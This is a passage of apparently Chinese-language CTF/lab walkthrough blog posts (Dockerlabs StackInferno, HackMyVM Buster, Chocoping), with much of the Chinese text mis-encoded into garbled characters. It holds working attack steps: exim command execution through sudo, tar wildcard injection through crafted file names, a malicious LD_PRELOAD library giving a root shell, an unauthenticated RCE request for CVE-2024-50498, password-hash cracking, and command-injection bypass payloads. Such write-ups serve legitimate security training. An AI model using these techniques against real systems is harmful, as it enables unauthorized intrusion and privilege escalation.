å…³äºæœ€è¿‘é‚£æ¬¡äº‹ä»¶çš„æŠ¥å‘Šï¼Œç„¶åå†æŠŠæ‰€æœ‰æŠ¥å‘Šå‘é€ç»™å¾·æ‹‰ç§‘å°”æœ‰é™å…¬å¸ï¼ˆDracor S.A.ï¼‰çš„éƒ¨é—¨äº†ã€‚é‰´äºæˆ‘ä¸åœ¨ï¼Œæˆ‘ä¼šå’Œç®¡ç†å‘˜è¯´ï¼Œè®©ä»–ç»™ä½ åˆ†é…æƒé™ï¼Œè¿™æ ·ä½ å°±å¯ä»¥ç”¨æˆ‘çš„é‚®ç®±æŠŠæŠ¥å‘Šå‘é€ç»™å¾·æ‹‰ç§‘å°”æœ‰é™å…¬å¸ï¼Œå› ä¸ºä»–ä»¬æ­£ç­‰ç€æˆ‘å°±è¿™ä¸ªäº‹æƒ…ç»™å›å¤å‘¢ã€‚æ‰€ä»¥ç­‰ä½ æŠŠæŠ¥å‘Šå‡†å¤‡å¥½åï¼Œè¯·å‘é€ä¸€ä¸‹ã€‚\r# carlos to robert\rä½ å¥½ï¼Œç½—ä¼¯ç‰¹ï¼Œå¤ªå¥½äº†ï¼ŒæŠ¥å‘Šæ˜å¤©å°±ä¼šå‡†å¤‡å¥½ã€‚ä½ å’Œç®¡ç†å‘˜è¯´ä¸€ä¸‹ï¼Œæœ‰ä»»ä½•æ–°æƒ…å†µéƒ½é€šçŸ¥æˆ‘ã€‚ç¥å¥½ã€‚\r# robert to carlos\rä½ å¥½ï¼Œå¡æ´›æ–¯ï¼Œæˆ‘å·²ç»é€šçŸ¥ç®¡ç†å‘˜ï¼ˆrootï¼‰äº†ï¼Œä»–åœ¨ç­‰ä½ æŠŠç”³è¯·å‘é€åˆ° root@cybersec è¿™ä¸ªé‚®ç®±ã€‚è®°ä½ç”³è¯·çš„æ ¼å¼ï¼š\rç”³è¯·äººå§“åï¼š\ræ—¥æœŸï¼š\rä¿¡æ¯ï¼š\rç®€è¦æè¿°ï¼š\råœ¨æè¿°ä¸­ï¼Œä½ åŠ¡å¿…å†™ä¸Šä»¥ä¸‹æ¡ˆä»¶ç¼–å·ï¼Œä»¥ä¾¿å’Œæˆ‘çš„ç”³è¯·ä¿æŒè¿è´¯æ€§ï¼Œæ¡ˆä»¶ç¼–å·ï¼š000-01458ã€‚\rå¦å¤–ï¼Œç•™æ„ä½ çš„é‚®ç®±ï¼Œå› ä¸ºä¸€æ—¦ä»–ä»¬ç»™ä½ å¼€é€šæƒé™ï¼Œä½ å°±ä¼šæ”¶åˆ°é€šçŸ¥ã€‚ç¥å¥½ã€‚ ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œç”³è¯·æƒé™\necho -e \u0026#34;Nombre del solicitante: Carlos\\nFecha: $(date \u0026#39;+%Y-%m-%d\u0026#39;)\\nMensaje: Solicito permisos para enviar reporte a Dracor S.A.\\nBreve descripcion: Caso nro: 000-01458\u0026#34; | mail -s \u0026#34;Solicitud de permisos\u0026#34; root@cybersec æŸ¥çœ‹**/var/mail/carlos**\nFrom root@cybersec Wed Apr 16 12:43:10 2025\rReturn-path: \u0026lt;root@cybersec\u0026gt;\rEnvelope-to: carlos@cybersec\rDelivery-date: Wed, 16 Apr 2025 12:43:10 +0000\rReceived: from root by cybersec with local (Exim 4.96)\r(envelope-from \u0026lt;root@cybersec\u0026gt;)\rid 1u526c-00038R-2F\rfor carlos@cybersec;\rWed, 16 Apr 2025 12:43:06 +0000\rTo: carlos@cybersec\rSubject: exim\rMIME-Version: 1.0\rContent-Type: text/plain; charset=\u0026#34;ANSI_X3.4-1968\u0026#34;\rContent-Transfer-Encoding: 8bit\rMessage-Id: \u0026lt;E1u526c-00038R-2F@cybersec\u0026gt;\rFrom: root \u0026lt;root@cybersec\u0026gt;\rDate: Wed, 16 Apr 2025 12:43:06 +0000\rHola Carlos, ya puedes enviar correos como Robert. Estos permisos se revocarÃ¡n periÃ³dicamente y tendrÃ¡s que volver a solicitarlos.\r#ä½ å¥½ï¼Œå¡æ´›æ–¯ï¼Œä½ ç°åœ¨å¯ä»¥ä»¥ç½—ä¼¯ç‰¹çš„èº«ä»½å‘é€é‚®ä»¶äº†ã€‚è¿™äº›æƒé™ä¼šå®šæœŸè¢«æ’¤é”€ï¼Œå±Šæ—¶ä½ å°†ä¸å¾—ä¸å†æ¬¡ç”³è¯·å®ƒä»¬ã€‚ è¿™ä¸ªæ—¶å€™æ£€æŸ¥sudo -lï¼Œä¼šå‘ç°å¤šäº†ä¸€ä¸ªå‘½ä»¤\nsudo -u robert /usr/sbin/exim -be \u0026#39;${run{/usr/bin/cp /tmp/authorized_keys /home/robert/.ssh/authorized_keys}}\u0026#39; å¥½åƒæ˜¯å¿…é¡»é€šè¿‡ç»å¯¹è·¯å¾„æ¥æ‰§è¡Œ\nOwn pedro #\ræŸ¥çœ‹å®šæ—¶ä»»åŠ¡\nrobert@cybersec:/tmp$ cat /etc/crontab # /etc/crontab: system-wide crontab\r# Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39;\r# command to install the new version when you edit this file\r# and files in /etc/cron.d. These files also have username fields,\r# that none of the other crontabs do.\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\r# Example of job definition:\r# .---------------- minute (0 - 59)\r# | .------------- hour (0 - 23)\r# | | .---------- day of month (1 - 31)\r# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...\r# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\r# | | | | |\r# * * * * * user-name command to be executed\r17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly\r25 6 * * * root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily; }\r47 6 * * 7 root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly; }\r52 6 1 * * root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly; }\r#\r*/2 * * * * pedro /bin/bash /usr/local/bin/back.sh ä¸¤åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡è¿™ä¸ªè„šæœ¬ï¼Œrobertæ²¡æœ‰å†™å…¥æƒé™\nrobert@cybersec:/tmp$ cat /usr/local/bin/back.sh\r#!/bin/bash\rcd /home/share \u0026amp;\u0026amp; tar -czf /home/pedro/back.tar *\rrobert@cybersec:/tmp$ ls -al /usr/local/bin/back.sh\r-rwxr-x--- 1 pedro bk 63 Mar 27 14:11 /usr/local/bin/back.sh\rrobert@cybersec:/tmp$ groups robert users back bk æ³¨æ„åˆ°è¿™ä¸ªtarå‘½ä»¤æœ€åé¢è·Ÿä¸Šäº†ä¸€ä¸ªæ˜Ÿå·é€šé…ç¬¦ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«æ‹¼æ¥ä¸Šå»\ntar | GTFOBins å› æ­¤å¦‚æœæ˜¯å°†å‚æ•°åä½œä¸ºæ–‡ä»¶åæ‹¼ä¸Šå»çš„è¯ï¼Œä¼šè¢«è¯†åˆ«ä¸ºå‚æ•°\n#åœ¨/home/shareç›®å½•ä¸‹\recho \u0026#34;mkdir /home/pedro/.ssh/;cp /tmp/authorized_keys /home/pedro/.ssh/authorized_keys\u0026#34; \u0026gt;shell.sh\rtouch -- \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34;\rtouch -- \u0026#34;--checkpoint=1\u0026#34; ç­‰ä¸€ä¼šå°±èƒ½ç™»å½•äº†\nRoot #\ræŸ¥çœ‹mboxæ¶ˆæ¯\n# admin to pedro\rä½©å¾·ç½—ï¼Œæˆ‘ä»¬åœ¨æˆ‘ç•™åœ¨ä½ ç›®å½•é‡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ£€æµ‹åˆ°äº†ä¸€ä¸ªå¯èƒ½å­˜åœ¨çš„åé—¨ã€‚ï¼ˆè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¾·æ‹‰ç§‘å°”æœ‰é™å…¬å¸ä¹‹å‰çš„å¼€å‘å›¢é˜Ÿå¼€å‘çš„ï¼Œç”¨äºè®°å½•å‘˜å·¥çš„å‡ºå…¥æƒ…å†µï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä½ å¯¹å…¶è¿›è¡Œåˆ†æï¼Œå¹¶å°½å¿«æäº¤ä¸€ä»½æŠ¥å‘Šã€‚æœŸå¾…ä½ çš„åé¦ˆï¼Œç¥å¥½ã€‚\r# pedro to amin\rä¸‹åˆå¥½ï¼Œæˆ‘å…ˆå‘æ‚¨æ±‡æŠ¥æˆªè‡³ç›®å‰åˆ†æå¾—å‡ºçš„æœ€ç›¸å…³æ•°æ®ã€‚\rå®é™…ä¸Šï¼Œè¯¥äºŒè¿›åˆ¶æ–‡ä»¶ç¡®å®å­˜åœ¨ä¸€ä¸ªåé—¨ï¼Œè¿™ä¸ªåé—¨æ˜¯é€šè¿‡ä¸€ä¸ªåœ¨ç¨‹åºæ­£å¸¸æ‰§è¡Œè¿‡ç¨‹ä¸­ä»æœªè¢«è°ƒç”¨è¿‡çš„å‡½æ•°æ¥æ¿€æ´»çš„ã€‚åŒæ—¶è¿˜æ£€æµ‹åˆ°äº†ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºæƒ…å†µï¼Œè¿™å¾ˆå¯èƒ½æ˜¯è¿›å…¥è¯¥åé—¨çš„è§¦å‘å› ç´ ã€‚ç„¶è€Œï¼Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘åœ¨è¿›ä¸€æ­¥æ·±å…¥åˆ†ææ–¹é¢å—åˆ°äº†ä¸€äº›é™åˆ¶ï¼Œå› ä¸ºæ— æ³•è°ƒè¯•è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæ²¡æœ‰æƒé™ï¼‰ï¼Œå¹¶ä¸”ä¹Ÿæ— æ³•åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œå®ƒã€‚è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¼šå¯¹å…¶æ‰§è¡Œç¯å¢ƒè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ£€æµ‹åˆ°æ˜¯åœ¨è™šæ‹Ÿæœºä¸­ï¼Œå®ƒå°±ä¸ä¼šè¿è¡Œï¼›å½“æˆ‘å°è¯•è°ƒè¯•å®ƒæ—¶ä¹Ÿæ˜¯ä¸€æ ·ï¼Œå®ƒæ£€æµ‹åˆ°æ­£åœ¨å°è¯•è°ƒè¯•ï¼Œå°±ä¸ä¼šè¿è¡Œã€‚\rå¦‚æœæœ‰å¯èƒ½çš„è¯ï¼Œæˆ‘éœ€è¦èƒ½å¤Ÿä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œè°ƒè¯•å™¨æ¥è°ƒè¯•è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶å¼ºåˆ¶è¿›è¡Œè°ƒè¯•æ“ä½œã€‚æœŸå¾…æ‚¨çš„å›å¤ï¼Œç¥å¥½ã€‚\r# admin to pedro\rä½ å¥½ï¼Œä½©å¾·ç½—ï¼Œæˆ‘è¯»äº†ä½ çš„é‚®ä»¶ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªé—®é¢˜æƒ³é—®ä½ ã€‚ä½ è§‰å¾—æœ‰æ²¡æœ‰å¯èƒ½ä¸ºè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å¼€å‘ä¸€ä¸ªæ¦‚å¿µéªŒè¯ï¼ˆPOCï¼‰å‘¢ï¼Ÿå› ä¸ºè¿™å°†æ˜¯å¯¹å¾·æ‹‰ç§‘å°”æœ‰é™å…¬å¸ä¹‹å‰å¼€å‘å›¢é˜Ÿæœ‰åŠ›çš„ä¸€æ¬¡æ£€éªŒã€‚\rè‡³äºç»™ä½ æƒé™ä»¥ä¾¿ä½ èƒ½å¤Ÿè°ƒè¯•è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæ¯•ç«Ÿæ— æ³•åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œå®ƒï¼Œä¹Ÿä¸èƒ½åœ¨æ²¡æœ‰æƒé™çš„æƒ…å†µä¸‹è°ƒè¯•å®ƒï¼‰ï¼Œæˆ‘ä¼šé€šçŸ¥ç®¡ç†å‘˜ï¼ˆè¶…çº§ç”¨æˆ·ï¼‰æ¥é…ç½®ç¯å¢ƒï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å°½å¯èƒ½å®‰å…¨åœ°å¤„ç†è¿™ä»¶äº‹ã€‚è¯·ç­‰å¾…æˆ‘çš„æ–°æ¶ˆæ¯ï¼Œæˆ‘å¾ˆå¿«ä¼šå†ç»™ä½ å†™ä¿¡â€¦â€¦\rä½ å¥½ï¼Œä½©å¾·ç½—ï¼Œæ­£å¦‚æˆ‘è·Ÿä½ è¯´è¿‡çš„ï¼Œæˆ‘ä¼šé€šçŸ¥ç®¡ç†å‘˜æ¥é…ç½®ç¯å¢ƒï¼Œè¿™æ ·å°±èƒ½ç»™ä½ æä¾›ä½ æ‰€è¦æ±‚çš„æƒé™ï¼Œç°åœ¨ä¸€åˆ‡éƒ½å·²å‡†å¤‡å°±ç»ªã€‚å½“ä½ éœ€è¦å…³äº GDBï¼ˆGNU è°ƒè¯•å™¨ï¼‰çš„æƒé™æ—¶ï¼Œä½ å°±é€šè¿‡ root@cybersec è”ç³»ç®¡ç†å‘˜å‘ŠçŸ¥ä»–ã€‚å’Œå¾€å¸¸ä¸€æ ·ï¼Œåœ¨å¼€å¯æƒé™ä¹‹å‰ï¼Œä½ å¿…é¡»å‘é€ä»¥ä¸‹ç”³è¯·æ ¼å¼çš„å†…å®¹ï¼š\rç”³è¯·äººå§“åï¼š\ræ—¥æœŸï¼š\rä¿¡æ¯ï¼š\rç®€è¦è¯´æ˜ï¼š æŸ¥çœ‹ä¸€ä¸‹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªåˆ†ææŠ¥å‘Š\n#pedro@cybersec:~/analisis_hallx$ cat notas_hallx.txt å…³äºå·²å‘ç°çš„äºŒè¿›åˆ¶æ–‡ä»¶ hallx çš„æŠ¥å‘Šç¬”è®°\räºŒè¿›åˆ¶æ–‡ä»¶çš„åŠŸèƒ½\rè¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¸»è¦åŠŸèƒ½æ˜¯è®°å½•ç”¨æˆ·çš„è¿›å‡ºæƒ…å†µã€‚\rå·²æ£€æµ‹åˆ°çš„æ¼æ´\rç¼“å†²åŒºæº¢å‡ºï¼š\rä»å›¾ç‰‡ä¸­å¯ä»¥çœ‹å‡ºï¼Œåœ¨factor2()å‡½æ•°ä¸­å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå› ä¸ºå®ƒå…è®¸è¯»å–æœ€å¤šï¼ˆ0x80ï¼‰128 ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä½†ç¼“å†²åŒºå¤§å°ä»…ä¸º 72 ä¸ªå­—èŠ‚ï¼Œè¿™å°±å¯¼è‡´äº†ç¼“å†²åŒºæº¢å‡ºï¼ˆBOFï¼‰ã€‚\ræ¶æ„å‡½æ•°ï¼š\råœ¨ç¨‹åºæ­£å¸¸æ‰§è¡ŒæœŸé—´ï¼Œfactor1()å‡½æ•°ä»æœªè¢«è°ƒç”¨è¿‡ï¼ˆå°±åƒå…¶ä»–ä¸€äº›æ— ç”¨ / å¡«å……å‡½æ•°ä¸€æ ·ï¼‰ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œé€šè¿‡execveè°ƒç”¨äº†ä¸€ä¸ª shell ç¨‹åºï¼ˆ/usr/bin/bashï¼‰ã€‚\rè™šæ‹ŸåŒ–æ£€æµ‹å’Œåè°ƒè¯•åŠŸèƒ½\rè¯¥äºŒè¿›åˆ¶æ–‡ä»¶åŒ…å«ä¸¤ä¸ªåœ¨ç¨‹åºå¼€å§‹æ—¶è¿è¡Œçš„å‡½æ•° [check_virtualization()å’ŒcheckDebugger()]ï¼Œè¿™äº›å‡½æ•°è´Ÿè´£æ£€æµ‹ç¨‹åºæ˜¯å¦åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­è¿è¡Œï¼ŒåŒæ—¶ä¹Ÿç”¨äºæ£€æµ‹æ˜¯å¦æ­£åœ¨å¯¹å…¶è¿›è¡Œè°ƒè¯•ã€‚ä¼¼ä¹åœ¨æ²¡æœ‰æƒé™çš„æƒ…å†µä¸‹ä¸å…è®¸è¿›è¡Œè°ƒè¯•ï¼ˆéœ€è¦åœ¨è™šæ‹Ÿæœºä¹‹å¤–å¯¹æ­¤è¿›è¡Œæµ‹è¯•ï¼‰ã€‚ å…ˆå‘é€ä»¥ä¸‹å‘½ä»¤è·å–æƒé™\n# å‘é€æƒé™ç”³è¯·é‚®ä»¶ï¼ˆåŒ…å«æ¡ˆä»¶ç¼–å·ï¼‰\recho -e \u0026#34;Nombre del solicitante: Pedro\\nFecha: $(date \u0026#39;+%d/%m/%Y\u0026#39;)\\nMensaje: Solicitud de privilegios de depuracion\\nBreve descripcion: Analisis de puerta trasera - Caso 000-0923\u0026#34; | mail -s \u0026#34;Solicitud GDB - Caso 000-0923\u0026#34; -a \u0026#34;From: pedro@cybersec\u0026#34; -a \u0026#34;Content-Type: text/plain; charset=ANSI_X3.4-1968\u0026#34; root@cybersec è¿™é‡Œå…ˆå‡†å¤‡ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶\n// gcc -shared -fPIC evil.c -o evil.so\r#include \u0026lt;stdlib.h\u0026gt;\r__attribute__((constructor)) void init() {\rsystem(\u0026#34;/bin/bash -p\u0026#34;);\r} ç„¶åè¿è¡Œ\npedro@cybersec:/var/mail$ sudo -u root /usr/local/bin/secure_gdb /home/pedro/hallx (gdb) set environment LD_PRELOAD=/home/pedro/evil.so\r(gdb) run ç„¶åå°±èƒ½è¿›å…¥åˆ°rootçš„shell\nè¿™é‡Œæˆ‘çš„soæ–‡ä»¶ä¸­å‘½ä»¤ç»™é”™äº†ï¼Œå¯¼è‡´ä¸€ç›´å¡åœ¨rootçš„bashé‡Œé¢ï¼Œé€€ä¸å‡ºå»\nå› æ­¤æ”¹æˆå…¶ä»–çš„ææƒè¯­å¥å°±å¥½äº†ï¼Œä¸å¿…å¼€å¯ä¸€ä¸ªbash\n#include \u0026lt;stdlib.h\u0026gt;\r__attribute__((constructor)) void init() {\rsystem(\u0026#34;chmod u+s /bin/bash\u0026#34;);\r} å†æ¬¡æ‰§è¡Œä¹‹åï¼Œå¯ä»¥æˆåŠŸè®¾ç½®SUIDï¼Œå¦å¤–ä¸€è¾¹ç›´æ¥å…³æ‰ç»ˆç«¯å°±å¥½äº†\nSummary #\rUserï¼šAPIæ¥å£æšä¸¾ï¼Œç”¨æˆ·åçˆ†ç ´ï¼Œå¾—åˆ°åŸŸåï¼Œä¸‹è½½åè¿›è¡Œé€†å‘åˆ†æï¼Œæ ¹æ®AESè§£å¯†å¾—åˆ°æ˜æ–‡ï¼Œè¾“å…¥åå¾—åˆ°ç”¨æˆ·çš„sshå¯†ç ã€‚é€šè¿‡å‘é€é‚®ä»¶å¯ä»¥è·å¾—åˆ°robertçš„sudoå‘½ä»¤æƒé™ã€‚æ ¹æ®pedroçš„å®šæ—¶ä»»åŠ¡ä¸­çš„é€šé…ç¬¦ï¼Œå¯ä»¥å†™å…¥æ¶æ„æ–‡ä»¶åï¼Œè®©å…¶å½“ä½œå‚æ•°å¤„ç†ï¼Œå¾—åˆ°pedroçš„æƒé™ã€‚\nRootï¼šè®¾ç½®æ¶æ„çš„LD_PRELOADç¯å¢ƒå˜é‡ï¼Œè®©å…¶æ‰§è¡Œçš„æ—¶å€™å¼•å…¥æ¶æ„ä»£ç ï¼Œè®¾ç½®bashçš„SUIDï¼ŒæˆåŠŸææƒã€‚\nç»ˆäºå†™å®Œäº†ï¼Œé•¿èˆ’ä¸€å£æ°”~~~~\n","date":"2025-04-17","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-stackinferno/","section":"Posts","summary":"","title":"Dockerlabs-stackinferno","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.151 -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\r| ssh-hostkey: | 2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)\r| 256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)\r|_ 256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)\r80/tcp open http nginx 1.14.2\r| http-robots.txt: 1 disallowed entry |_/wp-admin/\r|_http-server-header: nginx/1.14.2\r|_http-generator: WordPress 6.7.1\r|_http-title: bammmmuwe ç›´æ¥å°±æ‰«åˆ°äº†wordpressç›®å½•\nNuclei #\r[root@kali] /home/kali â¯ nuclei -u http://192.168.56.151 __ _\r____ __ _______/ /__ (_)\r/ __ \\/ / / / ___/ / _ \\/ /\r/ / / / /_/ / /__/ / __/ /\r/_/ /_/\\__,_/\\___/_/\\___/_/ v3.3.9\rprojectdiscovery.io\r[INF] Current nuclei version: v3.3.9 (outdated)\r[INF] Current nuclei-templates version: v10.1.7 (latest)\r[WRN] Scan results upload to cloud is disabled.\r[INF] New templates added in latest release: 64\r[INF] Templates loaded for current scan: 7880\r[INF] Executing 7687 signed templates from projectdiscovery/nuclei-templates\r[WRN] Loading 193 unsigned templates for scan. Use with caution.\r[INF] Targets loaded for current scan: 1\r[INF] Templates clustered: 1718 (Reduced 1615 Requests)\r[INF] Using Interactsh Server: oast.site\r[CVE-2024-50498] [http] [critical] http://192.168.56.151/index.php?rest_route=/wqc/v1/query Own www-data #\rå°è¯•å¤ç°è¿™ä¸ªCVEï¼šRandomRobbieBF/CVE-2024-50498: WP Query Console \u0026lt;= 1.0 - Unauthenticated Remote Code Execution\nPOST /wp-json/wqc/v1/query HTTP/1.1\rHost: 192.168.56.151\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rContent-Type: application/json\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\rContent-Length: 45\r{\u0026#34;queryArgs\u0026#34;:\u0026#34;phpinfo();\u0026#34;,\u0026#34;queryType\u0026#34;:\u0026#34;post\u0026#34;} æŸ¥çœ‹disable_functionsï¼Œå¯ä»¥ä½¿ç”¨shell_exec\nOwn welcome #\ræ ¹æ®wp-config.phpé‡Œçš„å‡­è¯ï¼Œè¿›å…¥æ•°æ®åº“\nwww-data@listen:~/html/wordpress$ mysql -ull104567 -pthehandsomeguy -e \u0026#39;use wordpress;select * from wp_users;\u0026#39; -E\r*************************** 1. row ***************************\rID: 1\ruser_login: ta0\ruser_pass: $P$BDDc71nM67DbOVN/U50WFGII6EF6.r.\ruser_nicename: ta0\ruser_email: 2814928906@qq.com\ruser_url: http://192.168.31.181\ruser_registered: 2025-01-08 03:10:43\ruser_activation_key: user_status: 0\rdisplay_name: ta0\r*************************** 2. row ***************************\rID: 2\ruser_login: welcome\ruser_pass: $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/\ruser_nicename: welcome\ruser_email: 127.0.0.1@qq.com\ruser_url: user_registered: 2025-01-08 04:29:28\ruser_activation_key: 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD.\ruser_status: 0\rdisplay_name: welcome ä½¿ç”¨johnçˆ†ç ´\n[root@kali] /home/kali/temp â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt â\rUsing default input encoding: UTF-8\rLoaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])\rCost 1 (iteration count) is 8192 for all loaded hashes\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\r104567 (?) 1g 0:00:00:22 DONE (2025-04-17 20:30) 0.04484g/s 33182p/s 33182c/s 33182C/s 10801..103645\rUse the \u0026#34;--show --format=phpass\u0026#34; options to display all of the cracked passwords reliably\rSession completed. Root #\r$ sudo -l\rMatching Defaults entries for welcome on listen:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser welcome may run the following commands on listen:\r(ALL) NOPASSWD: /usr/bin/gobuster å¯ä»¥ä½¿ç”¨**-v**å‚æ•°è¾“å‡ºè¯¦ç»†\nå¯æƒœçš„æ˜¯æˆ‘ä»¬æ— æ³•ç›´æ¥è¯»å–åˆ°**/root/root.txtä»¥åŠssh**å¯†é’¥ç­‰\næŸ¥çœ‹å®šæ—¶ä»»åŠ¡å‘¢ï¼Ÿå‘ç°ä¼šæ‰§è¡Œä¸€ä¸ªè„šæœ¬\nå› æ­¤å¯ä»¥å°è¯•æ¥è¿›è¡Œè¦†ç›–æ–‡ä»¶\né¦–å…ˆéœ€è¦åœ¨kaliçš„**/tmpé‡Œç”Ÿæˆä¸€ä¸ªaaa**æ–‡ä»¶\n[root@kali] /tmp â¯ touch aaa [root@kali] / â¯ python -m http.server 80 å†™å…¥ä¸€ä¸ªå­—å…¸ï¼ŒæŸ¥çœ‹å›æ˜¾\nwelcome@listen:~$ cat poc tmp/aaa\rwelcome@listen:~$ sudo /usr/bin/gobuster -u http://192.168.55.4/ -w ./poc -q -n /tmp/aaa å†å°†è¾“å‡ºå®šå‘åˆ°**/opt/.test.sh**ï¼Œæ³¨æ„ç»™aaaæ‰§è¡Œæƒé™\nwelcome@listen:~$ chmod +x /tmp/aaa welcome@listen:~$ sudo /usr/bin/gobuster -u http://192.168.55.4/ -w ./poc -q -n -o /opt/.test.sh /tmp/aaa Summary #\rUserï¼šé€šè¿‡CVEæ‹¿åˆ°æ•°æ®åº“å¯†ç hashè¿›è¡Œçˆ†ç ´\nRootï¼šé€šè¿‡æ—¥å¿—è¾“å‡ºä¿®æ”¹å®šæ—¶ä»»åŠ¡çš„å†…å®¹\n","date":"2025-04-17","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-buster/","section":"Posts","summary":"","title":"HackMyVM-buster","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Chocoping â¯ nmap 172.17.0.2 -sV -A -p- PORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.62\r|_http-title: Index of /\r|_http-server-header: Apache/2.4.62 (Debian)\r| http-ls: Volume /\r| SIZE TIME FILENAME\r| 1.0K 2025-04-05 11:13 ping.php Own www-data #\ræ³¨æ„åˆ°å¯ä»¥ä¼ å…¥ipå‚æ•°æ‰§è¡Œpingå‘½ä»¤\nä¸‹é¢æˆ‘ä¼šç”¨ä¸¤ç§æ‰«æå·¥å…·æ¥è¿›è¡Œå¯¹æ¯”\nè¿™é‡Œä½¿ç”¨wfuzzæ¥è¿›è¡Œæ‰«æ\n[root@kali] /home/kali/Chocoping â¯ wfuzz -c --hw 3 -z file,../Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt \u0026#34;http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ\u0026#34;\r/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information.\r********************************************************\r* Wfuzz 3.1.0 - The Web Fuzzer *\r********************************************************\rTarget: http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ\rTotal requests: 174\r=====================================================================\rID Response Lines Word Chars Payload =====================================================================\r000000070: 200 0 L 1 W 22 Ch \u0026#34;c\\\\a\\\\t+/et\\\\c/pas\\\\swd\u0026#34; 000000165: 200 0 L 1 W 22 Ch \u0026#34;cat `echo -e \u0026#34;\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\u0026#34;`\u0026#34; 000000142: 200 1 L 12 W 126 Ch \u0026#34;\\u\\n\\a\\m\\e \\-\\a\u0026#34; Total time: 0.078702\rProcessed Requests: 174\rFiltered Requests: 171\rRequests/sec.: 2210.858 å¯ä»¥çœ‹åˆ°å…¶ä¸­unameçš„æ‰§è¡Œç»“æœ\næ¥ä¸‹æ¥ä½¿ç”¨ffufï¼Œå¾—åˆ°åŒæ ·çš„ç»“æœ\n[root@kali] /home/kali/Chocoping â¯ ffuf -u \u0026#39;http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ\u0026#39; -w ../Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt -enc \u0026#39;FUZZ:urlencode\u0026#39; -fs 21\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 